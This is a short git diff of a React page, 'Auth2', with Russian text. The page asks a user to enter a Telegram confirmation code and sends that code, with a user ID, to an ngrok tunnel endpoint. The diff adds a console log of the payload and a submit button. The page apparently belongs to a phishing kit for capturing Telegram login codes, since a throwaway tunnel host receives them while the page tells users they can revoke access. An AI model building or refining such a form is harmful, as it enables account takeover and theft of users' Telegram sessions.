@@ -19,7 +19,7 @@ export default function Auth2() {
 
       const codeStr = code.join("");
 
-      alert(jsonify(codeStr));
+      console.log("BODY TO SEND:", { user_id: userId, code: codeStr });
 
       const res = await fetch("https://janene-unwilling-nonilluminatingly.ngrok-free.dev/api/send_code", {
         method: "POST",
@@ -59,10 +59,6 @@ export default function Auth2() {
     if (value && index < CODE_LENGTH - 1) {
       inputsRef.current[index + 1]?.focus(); 
     }
-
-    if (newCode.every(digit => digit !== "")) {
-        handleSubmitCode()
-    }
   };
 
   const handleKeyDown = (e, index) => {
@@ -101,6 +97,14 @@ export default function Auth2() {
       <p className="mt-5 text-sm text-gray-400">
         Вы можете отозвать доступ в любое время в настройках Telegram
       </p>
+
+      <button
+        onClick={handleSubmitCode}
+        disabled={code.some(digit => digit === "")}
+        className="mt-6 px-8 py-3 bg-blue-500 text-white text-lg font-semibold rounded-lg hover:bg-blue-600 disabled:bg-gray-600 disabled:cursor-not-allowed transition"
+      >
+        Отправить
+      </button>
     </div>
   );
 }
